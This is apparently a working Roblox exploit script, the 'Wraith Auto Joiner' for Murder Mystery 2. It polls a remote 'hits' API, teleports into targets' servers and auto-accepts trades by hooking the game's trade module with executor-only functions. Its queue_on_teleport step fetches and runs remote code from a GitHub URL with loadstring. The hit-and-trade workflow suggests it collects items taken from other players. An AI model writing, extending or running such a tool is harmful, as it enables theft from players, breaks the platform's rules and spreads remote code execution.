-- discord.gg/wraith

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)
		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end
	return function()
		local r = table.pack(f(s, c))
		if r[1] == nil then return false end
		c = r[1]
		return true, table.unpack(r, 1, r.n)
	end
end

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local Players           = game:GetService("Players")
local TeleportService   = game:GetService("TeleportService")
local HttpService       = game:GetService("HttpService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")
local ContentProvider   = game:GetService("ContentProvider")

local API_URL  = "https://api-wraith-production.up.railway.app"
local token    = _G.Token or ""
local LocalPlayer = Players.LocalPlayer
local Name     = LocalPlayer.Name

if token == "" then
	warn("[Wraith AJ] _G.Token não definido.")
	return
end

-- ── JobId real (Delta fix) ────────────────────────────────────────────────────
local function getJobId()
	local ok, result = pcall(gethiddenproperty, game, "JobId")
	if ok and type(result) == "string" and result ~= "" and result ~= "00000000-0000-0000-0000-000000000000" then
		return result
	end
	local ok2, result2 = pcall(getproperties, game)
	if ok2 and result2 and type(result2.JobId) == "string" and result2.JobId ~= "" then
		return result2.JobId
	end
	return game.JobId
end

getgenv().JOBID = getJobId()
while not getgenv().JOBID do task.wait() end
local JOBID = getgenv().JOBID
print("[Wraith AJ] Real JobId: " .. JOBID .. "\nFake JobId: " .. game.JobId)

-- ── preload remotes ───────────────────────────────────────────────────────────
task.spawn(function()
	local t = {}
	for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
		if d:IsA("RemoteFunction") or d:IsA("RemoteEvent") then
			table.insert(t, d)
		end
	end
	pcall(ContentProvider.PreloadAsync, ContentProvider, t)
end)

-- ── device select bypass ──────────────────────────────────────────────────────
local clickEvents = { "MouseButton1Click", "MouseButton1Down", "Activated" }

local function tapUI(obj)
	if not obj then return end
	for _, ev in pairs(clickEvents) do
		local signal = obj[ev]
		if signal then
			local iter = geniter(pairs(getconnections(signal)))
			local ok, _, conn = iter()
			if ok then
				while true do
					pcall(function() conn.Function() end)
					local ok2, _, conn2 = iter()
					if ok2 then conn = conn2 else break end
				end
			end
		end
	end
end

task.spawn(function()
	repeat
		task.wait(1)
		pcall(function() tapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Phone.Button) end)
		pcall(function() tapUI(LocalPlayer.PlayerGui.Join.Friends.Play) end)
	until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
end)

-- ── TradeModule hook ──────────────────────────────────────────────────────────
local UpdateTradeFn
local lastOfferVal = 0
_G.LastOffer = nil

local function hookTradeModule()
	local ok, mod = pcall(function()
		return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
	end)
	if not ok or not mod then return false end
	if type(mod.UpdateTrade) ~= "function" then return false end
	UpdateTradeFn = mod.UpdateTrade
	mod.UpdateTrade = function(data)
		pcall(function()
			if type(data) == "table" and data.LastOffer ~= nil then
				_G.LastOffer = data.LastOffer
				lastOfferVal = data.LastOffer
				print("[Wraith AJ] UpdateTrade hook → LastOffer =", tostring(data.LastOffer))
			end
		end)
		return UpdateTradeFn(data)
	end
	return true
end
hookTradeModule()

local function getLastOffer()
	if _G.LastOffer ~= nil then return _G.LastOffer end
	return lastOfferVal
end

-- ── trade remote setup ────────────────────────────────────────────────────────
local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not Trade then return end

local tradeOpen = false
local tradeDone = false
local tradeAccepted = false

local SendRequest = Trade:FindFirstChild("SendRequest")
if SendRequest then
	SendRequest.OnClientInvoke = newcclosure(function()
		pcall(function() Trade.AcceptRequest:FireServer() end)
		return true
	end)
end

local StartTrade = Trade:FindFirstChild("StartTrade")
if StartTrade then
	StartTrade.OnClientEvent:Connect(function()
		tradeOpen = true; tradeDone = false
	end)
end

local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
if DeclineTrade then
	DeclineTrade.OnClientEvent:Connect(function()
		tradeOpen = false; tradeDone = true
	end)
end

local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
if AcceptTrade then
	AcceptTrade.OnClientEvent:Connect(function(v)
		if v then
			tradeOpen = false; tradeDone = true; tradeAccepted = true
		else
			tradeAccepted = true
		end
	end)
end

local UpdateTrade2 = Trade:FindFirstChild("UpdateTrade")
if UpdateTrade2 then
	UpdateTrade2.OnClientEvent:Connect(function(data)
		if type(data) ~= "table" then return end
		if data.LastOffer ~= nil then
			_G.LastOffer = data.LastOffer
			lastOfferVal = data.LastOffer
			print("[Wraith AJ] Remote UpdateTrade → LastOffer =", tostring(data.LastOffer))
		end
	end)
end

-- loop aceita trades
task.spawn(function()
	while true do
		task.wait(0.2)
		if tradeOpen then
			local t0 = tick()
			local stableOffer
			local stableTime = 0

			while tick() - t0 < 9 do
				if not tradeOpen then if tradeDone then break end end
				local lo = _G.LastOffer or lastOfferVal
				if lo and lo ~= 0 then
					if lo ~= stableOffer then
						stableOffer = lo
						stableTime = tick()
					elseif tick() - stableTime >= 0.8 then
						break
					end
				end
				task.wait(0.05)
			end

			if not tradeOpen and tradeDone then continue end

			local offer = getLastOffer() or lastOfferVal or 0
			tradeAccepted = false
			tradeDone = false

			pcall(function()
				Trade.AcceptTrade:FireServer(game.PlaceId * 3, offer)
				print("[Wraith AJ] AcceptTrade fired with:", tostring(offer))
			end)

			local t1 = tick()
			while not tradeAccepted and not tradeDone and tick() - t1 < 10 do
				task.wait(0.05)
			end
			if tradeAccepted then print("[Wraith AJ] Accept registered ✓") end
		end
	end
end)

-- auto-decline stale trades
task.spawn(function()
	while true do
		local ok, status = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
		if ok and status == "StartTrade" then
			local elapsed = 0
			while true do
				elapsed += task.wait(0.1)
				if elapsed >= 7 then
					Trade.DeclineTrade:FireServer()
					print("[Wraith AJ] Auto-declined stale trade")
					break
				end
				local ok2, s2 = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
				if ok2 and s2 ~= "StartTrade" then break end
			end
		elseif ok and status == "ReceivingRequest" then
			Trade.AcceptRequest:FireServer()
			print("[Wraith AJ] Auto-accepted incoming request")
		end
		task.wait(0.1)
	end
end)

-- ── anti-idle ─────────────────────────────────────────────────────────────────
task.spawn(function()
	local VirtualUser = game:GetService("VirtualUser")
	LocalPlayer.Idled:Connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)
	pcall(function() VirtualUser:CaptureController() end)
	while true do
		task.wait(60)
		pcall(function()
			VirtualUser:Button1Down(Vector2.new(0,0), CFrame.new())
			task.wait(0.1)
			VirtualUser:Button1Up(Vector2.new(0,0), CFrame.new())
		end)
	end
end)

-- ── UI ────────────────────────────────────────────────────────────────────────
local ACCENT      = Color3.fromRGB(0, 100, 220)
local ACCENT_GLOW = Color3.fromRGB(0, 140, 255)
local BG          = Color3.fromRGB(8, 12, 22)
local BG2         = Color3.fromRGB(12, 18, 32)
local TEXT_MAIN   = Color3.fromRGB(210, 225, 255)
local TEXT_DIM    = Color3.fromRGB(120, 150, 200)
local GREEN       = Color3.fromRGB(60, 220, 140)
local RED         = Color3.fromRGB(220, 60, 80)
local YELLOW      = Color3.fromRGB(220, 180, 50)
local CYAN        = Color3.fromRGB(80, 200, 255)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "WraithAutoJoiner"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 99999
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then
	ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

-- ── main frame ────────────────────────────────────────────────────────────────
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 310, 0, 148)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = BG
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)

local stroke = Instance.new("UIStroke", Frame)
stroke.Color = ACCENT
stroke.Thickness = 1.5

-- top bar
local TopBar = Instance.new("Frame", Frame)
TopBar.Size = UDim2.new(1, 0, 0, 28)
TopBar.BackgroundColor3 = BG2
TopBar.BorderSizePixel = 0
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 10)

-- bottom filler pra esconder cantos arredondados do topbar na parte inferior
local TopBarFill = Instance.new("Frame", TopBar)
TopBarFill.Size = UDim2.new(1, 0, 0, 10)
TopBarFill.Position = UDim2.new(0, 0, 1, -10)
TopBarFill.BackgroundColor3 = BG2
TopBarFill.BorderSizePixel = 0

-- accent line embaixo do topbar
local AccentLine = Instance.new("Frame", Frame)
AccentLine.Size = UDim2.new(1, 0, 0, 2)
AccentLine.Position = UDim2.new(0, 0, 0, 28)
AccentLine.BackgroundColor3 = ACCENT
AccentLine.BorderSizePixel = 0

-- título
local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "🔪  WRAITH AUTO JOINER  v1.0"
Title.TextColor3 = ACCENT_GLOW
Title.Font = Enum.Font.GothamBold
Title.TextSize = 12
Title.TextXAlignment = Enum.TextXAlignment.Left

-- drag
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
local lastInput
Frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		lastInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == lastInput and dragging then
		local delta = input.Position - dragStart
		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- labels
local function makeLabel(text, yOff, color, bold, size)
	local lbl = Instance.new("TextLabel", Frame)
	lbl.Size = UDim2.new(1, -16, 0, 18)
	lbl.Position = UDim2.new(0, 10, 0, yOff)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = color or TEXT_MAIN
	lbl.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
	lbl.TextSize = size or 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	return lbl
end

makeLabel("User:  " .. Name, 34, TEXT_DIM)
local lblStatus  = makeLabel("Status:  iniciando...", 54, TEXT_MAIN)
local lblAction  = makeLabel("Action:  —", 74, CYAN)
local lblTimer   = makeLabel("⏱️  0s", 94, Color3.fromRGB(160, 180, 255))

-- divider
local Divider = Instance.new("Frame", Frame)
Divider.Size = UDim2.new(1, -20, 0, 1)
Divider.Position = UDim2.new(0, 10, 0, 116)
Divider.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
Divider.BorderSizePixel = 0

local lblToken = makeLabel("Token:  " .. token:sub(1,16) .. "…", 120, TEXT_DIM)
lblToken.TextSize = 10

-- uptime
local startTime = tick()
task.spawn(function()
	while true do
		task.wait(1)
		local e = tick() - startTime
		local s = math.floor(e % 60)
		local m = math.floor(e / 60 % 60)
		local h = math.floor(e / 3600 % 24)
		local d = math.floor(e / 86400)
		if d > 0 then
			lblTimer.Text = string.format("⏱️  %dd %dh %dm %ds", d, h, m, s)
		elseif h > 0 then
			lblTimer.Text = string.format("⏱️  %dh %dm %ds", h, m, s)
		elseif m > 0 then
			lblTimer.Text = string.format("⏱️  %dm %ds", m, s)
		else
			lblTimer.Text = string.format("⏱️  %ds", s)
		end
	end
end)

local function setStatus(text, color)
	lblStatus.Text = "Status:  " .. text
	lblStatus.TextColor3 = color or TEXT_MAIN
end
local function setAction(text)
	lblAction.Text = "Action:  " .. text
end

-- ── helpers de request ────────────────────────────────────────────────────────
local request_ = (syn and syn.request) or (http and http.request) or http_request or request

local function apiGet(url)
	if not request_ then return nil end
	local ok, res = pcall(request_, {
		Url    = url,
		Method = "GET",
		Headers = { ["Content-Type"] = "application/json" },
	})
	if not ok or not res or not res.Body then return nil end
	local ok2, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
	return ok2 and data or nil
end

local function apiPost(url, body)
	if not request_ then return nil end
	local ok, res = pcall(request_, {
		Url     = url,
		Method  = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body    = HttpService:JSONEncode(body),
	})
	if not ok or not res or not res.Body then return nil end
	local ok2, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
	return ok2 and data or nil
end

-- ── player check ──────────────────────────────────────────────────────────────
local function playerInServer(name)
	if not name or name == "" then return false end
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Name == name then return true end
	end
	return false
end

-- ── complete hit ──────────────────────────────────────────────────────────────
local watchActive = false
local watchStart  = nil

local function resetState()
	watchActive = false
	watchStart  = nil
	setAction("idle")
end

local function completeHit(hitId)
	setStatus("✅ Completing hit...", GREEN)
	apiPost(API_URL .. "/complete-hit", {
		hit_id    = hitId,
		username  = Name,
		game_type = "mm2",
		token     = token,
	})
	resetState()
end

-- ── teleport ──────────────────────────────────────────────────────────────────
local function doTeleport(placeId, jobId)
	local pid = tonumber(placeId)
	if not pid then return "failed" end
	pcall(function() TeleportService:TeleportCancel() end)
	task.wait(0.2)
	for i = 1, 20 do
		local prevJob = game.JobId
		local ok, err = pcall(function()
			TeleportService:TeleportToPlaceInstance(pid, jobId, LocalPlayer)
		end)
		if not ok then
			local e = tostring(err):lower()
			if e:find("not available") or e:find("invalid") or e:find("does not exist") then
				return "unavailable"
			end
			task.wait(1)
			continue
		end
		task.wait(4)
		if game.JobId ~= prevJob then
			if game.JobId == jobId then return "success" end
		end
		if game.JobId == prevJob and i < 20 then task.wait(1) end
	end
	return "failed"
end

-- ── queue_on_teleport ─────────────────────────────────────────────────────────
pcall(function()
	if type(queue_on_teleport) ~= "function" then return end
	local entry = string.format(
		"_G.Token = %q\ntask.wait(2)\nloadstring(game:HttpGet(%q, true))()",
		token,
		"https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/Wraith-joiner"
	)
	queue_on_teleport(entry)
end)

-- ── main loop ─────────────────────────────────────────────────────────────────
task.spawn(function()
	task.wait(2)
	setStatus("🔍 Polling...", Color3.fromRGB(140, 160, 220))

	while true do
		task.wait(1)

		local data = apiGet(
			API_URL .. "/hits?token=" .. HttpService:UrlEncode(token)
			.. "&username=" .. HttpService:UrlEncode(Name)
			.. "&job_id="   .. HttpService:UrlEncode(JOBID)
		)

		if not data then
			setStatus("⚠️ Sem resposta", RED)
			continue
		end

		local action = data.action

		if not action or action == "idle" then
			setStatus("🔍 Polling...", Color3.fromRGB(140, 160, 220))
			resetState()
			continue
		end

		-- ── teleport ──────────────────────────────────────────────────────────
		if action == "teleport" then
			resetState()

			if data.job_id == JOBID then
				setStatus("✅ Already in server", GREEN)
				continue
			end

			local sender = data.sender or "?"
			setStatus("🚀 Teleporting to " .. sender .. "...", GREEN)
			setAction("teleport → " .. tostring(data.job_id):sub(1,18) .. "…")
			print("[Wraith AJ] 🎯 HIT! From:", sender, "| Job:", data.job_id)

			local result = doTeleport(data.place_id or 142823291, data.job_id)

			if result ~= "unavailable" and result ~= "failed" then
				print("[Wraith AJ] ✅ Teleport in progress — autoexec will resume in new server")
				continue
			end

			setStatus("❌ Teleport " .. result .. " — skipping", RED)
			completeHit(data.hit_id)
			continue
		end

		-- ── watch ─────────────────────────────────────────────────────────────
		if action == "watch" then
			setAction("watch")
			local sender = data.sender or "?"
			local elapsed = 0

			if not watchActive then
				watchActive = true
				watchStart  = tick()
				setStatus("👀 Watching for " .. sender, YELLOW)
				print("[Wraith AJ] 👁️ Watch mode — sender:", sender)
			end

			elapsed = tick() - (watchStart or tick())

			if playerInServer(data.sender) then
				watchActive = true
				setStatus("👀 " .. sender .. " is trading...", GREEN)
				if elapsed >= 90 then
					setStatus("⏰ Watch timeout — giving up", Color3.fromRGB(255, 120, 50))
					completeHit(data.hit_id)
				end
				continue
			elseif watchActive then
				setStatus("✅ Sender left — hit complete!", GREEN)
				completeHit(data.hit_id)
				continue
			else
				setStatus("❌ Sender never arrived", RED)
				completeHit(data.hit_id)
				continue
			end
		end

		-- ── fallback ──────────────────────────────────────────────────────────
		setStatus("🔍 Polling...", Color3.fromRGB(140, 160, 220))
		resetState()
	end
end)

print("[Wraith AJ] 🔪 Wraith Auto Joiner v1.0 — online")
print("[Wraith AJ] 🖱️  GUI is draggable")
